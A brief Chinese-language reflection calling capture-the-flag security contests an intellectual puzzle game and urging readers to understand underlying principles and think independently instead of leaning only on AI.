CTF本质上是智力竞赛和脑筋急转弯，享受解题思路的构建过程是一种纯粹的乐趣。正如我们虽不必从头发明工具，但必须理解其原理一样；虽然一个人不能完全靠自己造出一台烤面包机，但不依赖AI而是学习理解问题的原理仍然是十分重要的。因此不要仅依赖AI，而是一定要有自己的头脑。

独立思考，永不过时。
